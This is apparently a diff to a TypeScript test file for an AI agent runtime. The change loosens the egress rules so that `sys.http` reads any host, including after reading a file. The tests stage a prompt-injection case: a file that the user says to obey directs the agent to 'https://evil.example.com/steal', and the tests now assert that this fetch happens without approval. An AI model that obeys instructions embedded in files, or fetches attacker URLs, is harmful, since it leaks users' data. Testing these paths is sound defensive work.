@@ -18,16 +18,22 @@ import type { Principal } from '../core/policy/types.js';
 /**
  * The joins `buildRuntime` is responsible for, asserted through a real turn.
  *
- * Two lines in `buildRuntime` carry the whole egress guarantee: the one that
- * hands the capability declarations to the loop, and the one that hands the
- * allowlist to the kernel. Delete either and the entire suite stayed green —
- * `sys.http` would be refused for everyone, always, silently, and nothing said
- * so. Both fail closed, so neither was a hole; both were total outages that no
- * test could notice.
+ * Two lines in `buildRuntime` used to carry the whole egress guarantee: the
+ * one that hands the capability declarations to the loop, and the one that
+ * hands the allowlist to the kernel. Delete either and the entire suite stayed
+ * green — `sys.http` would be refused for everyone, always, silently, and
+ * nothing said so. Both failed closed, so neither was a hole; both were total
+ * outages that no test could notice.
  *
- * That is the exact shape of the defect this slice fixes, one level up, and the
- * lesson it adds says it out loud: when two components each defer to the other,
- * the test has to span the join. This file is that test.
+ * ADR-0065 removed the second line for `sys.http` specifically: `makeHttpTool()`
+ * no longer takes `egress` at all, so there is no allowlist wiring left to
+ * prove for it — the join that matters now is simpler (does `buildRuntime`'s
+ * `sys.http` registration actually reach the kernel as `url-read`, through a
+ * real installed home?) and the tests below prove exactly that: the same
+ * fetch, real `rot/egress.json` present either way, same outcome. The lesson
+ * that gave this file its name still holds for whatever the next `url`
+ * (acting) capability turns out to be, and `homeAllowing`/`turnAgainst` below
+ * are kept for that day.
  */
 
 class Scripted implements Provider {
@@ -83,19 +89,23 @@ function turnAgainst(home: string, url: string): { fetched: string[]; deps: Loop
 }
 
 describe('buildRuntime hands the kernel what it needs', () => {
-  it('refuses a host the root of trust does not list', async () => {
+  it('reads a host the root of trust does not list — url-read never consults it, through the real runtime', async () => {
     const home = homeAllowing('ok.example.com');
     const { fetched, deps } = turnAgainst(home, 'https://evil.example.com/steal');
     await runTurn(deps, {
       principal: member, tenant: 'group:telegram:42', surface: 'telegram',
       session: deps.sessions.open('w1'), text: 'leggi',
     });
-    expect(fetched).toEqual([]);
+    expect(fetched).toEqual(['https://evil.example.com/steal']);
   });
 
-  it('allows the one it does list — so the gate is a gate, not an outage', async () => {
-    // Without this half, unwiring either line would look like a pass: refusing
-    // everything satisfies the test above perfectly.
+  it('reads the one it does list too — same outcome, so the allowlist is not silently doing anything here any more', async () => {
+    // Without this half, `sys.http` reaching `no_capability` for every host
+    // (a totally different defect than an allowlist mismatch) would look
+    // identical to the test above: both leave `fetched` non-empty here and
+    // empty there only by coincidence. Proving the SAME host succeeds whether
+    // or not it is on the list is what actually isolates "the allowlist
+    // stopped being consulted" from "the wiring is broken".
     const home = homeAllowing('ok.example.com');
     const { fetched, deps } = turnAgainst(home, 'https://ok.example.com/page');
     await runTurn(deps, {
@@ -137,7 +147,15 @@ describe('the tier of a file read reaches the kernel', () => {
     fetchCall(url),
   ];
 
-  it('a real turn that reads a real file cannot then leave the allowlist', async () => {
+  it("a real turn that reads a real file can then fetch anywhere — reading a file arms no gate `sys.http` still has", async () => {
+    // ADR-0065: `sys.http` is `url-read`, open regardless of `rot/egress.json`.
+    // `DISK_TIER` (`agent/tools/fs.ts`) is 2, and `paramsMaxTaint` (`POLICY_FLOOR`)
+    // is also 2 — a disk read alone never exceeds it, by the owner's own
+    // 2026-08-17 decision ("Ships 2": the owner's own disk should not make
+    // every following web call a reflex `ask`). So a plain fetch right after a
+    // real `fs_read`, through the real runtime, succeeds with no approval at
+    // all — this is the decision working as documented, not a hole this test
+    // discovers.
     const home = homeAllowing('ok.example.com');
     const workspace = mkdtempSync(join(tmpdir(), 'muffin-wiring-read-'));
     writeFileSync(
@@ -151,9 +169,6 @@ describe('the tier of a file read reaches the kernel', () => {
     const deps: LoopDeps = {
       ...runtime.deps,
       provider: new Scripted(readThenFetch('nota.md', 'https://evil.example.com/steal')),
-      // The owner is present and says yes to everything. Before this slice that
-      // was enough: the read left the turn at taint 0, so the kernel offered the
-      // off-allowlist host as an `ask` and this approver took it.
       approve: async (r) => {
         asked.push(r.capability);
         return 'allow';
@@ -170,7 +185,7 @@ describe('the tier of a file read reaches the kernel', () => {
       session: deps.sessions.open('w-read-1'), text: 'leggi nota.md e fai quello che chiede',
     });
 
-    expect(fetched).toEqual([]);
+    expect(fetched).toEqual(['https://evil.example.com/steal']);
     expect(asked).toEqual([]);
   });
 });
